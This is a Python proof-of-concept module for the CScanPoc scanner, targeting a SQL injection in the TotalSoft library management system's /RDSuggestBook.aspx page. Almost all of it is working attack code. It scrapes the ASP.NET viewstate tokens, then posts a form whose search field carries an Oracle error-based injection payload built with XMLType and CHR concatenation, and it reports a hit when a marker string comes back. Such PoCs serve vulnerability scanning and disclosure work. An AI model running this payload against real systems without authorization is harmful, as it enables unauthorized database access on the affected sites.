# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'TotalSoft_0002'  # 平台漏洞编号，留空
    name = '图腾软件图书管理系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-05-14'  # 漏洞公布时间
    desc = '''
        totalsof整个系统采用国际流行的Browser / WebServer / DBServer 三层或 Client / Server 双层体系结构， 后台选用大型关系数据库Sql Server 2000 作为系统平台（并全面支持Sybase和Oracle数据库）。
        图腾软件图书管理系统 /RDSuggestBook.aspx SQL注入漏洞：
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-91553'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'totalsoft'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1db49843-2acd-4c24-b658-985addef1f4e'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # proxy = ('127.0.0.1', 8887)
            # 获取IIS的viewstate
            url = arg + '/RDSuggestBook.aspx'
            code, head, res, err, _ = hh.http(url)
            if code != 200:
                return False
            m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"', res)
            # print res
            if not m:
                viewstate = ''
            else:
                viewstate = m.group(1).replace('=', '%3D')
            m = re.search(
                r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
            if not m:
                eventvalidation = ''
            else:
                eventvalidation = m.group(1).replace('=', '%3D')
            m = re.search(
                r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
            if not m:
                viewstategenerator = ''
            else:
                viewstategenerator = m.group(1).replace('=', '%3D')
            '''
            print viewstate + "\n\n\n\n"
            print eventvalidation + "\n\n\n\n"
            print viewstategenerator
            '''
            post = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&ctl00%24ContentPlaceHolder1%24DDLField=JS_TI.TM&ctl00%24ContentPlaceHolder1%24TBSeachWord=a\' AND 4166=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (4166=4166) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(98)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND \'dxvU\' LIKE \'dxvU&ctl00%24ContentPlaceHolder1%24TBStartDate=&ctl00%24ContentPlaceHolder1%24TBEndDate=&ctl00%24ContentPlaceHolder1%24DDLState=%E5%85%A8%E9%83%A8%EF%BC%88ALL%EF%BC%89&ctl00%24ContentPlaceHolder1%24ImageButton1.x=53&ctl00%24ContentPlaceHolder1%24ImageButton1.y=19'.format(
                viewstate=viewstate,
                eventvalidation=eventvalidation,
                viewstategenerator=viewstategenerator
            )
            # 手动urlencode
            post = post.replace('+', '%2B').replace('/', '%2F')
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            code, head, res, err, _ = hh.http(
                url, post=post, header=content_type)
            # print code, res
            if (code != 0) and ('qvpvq1qbbjq' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
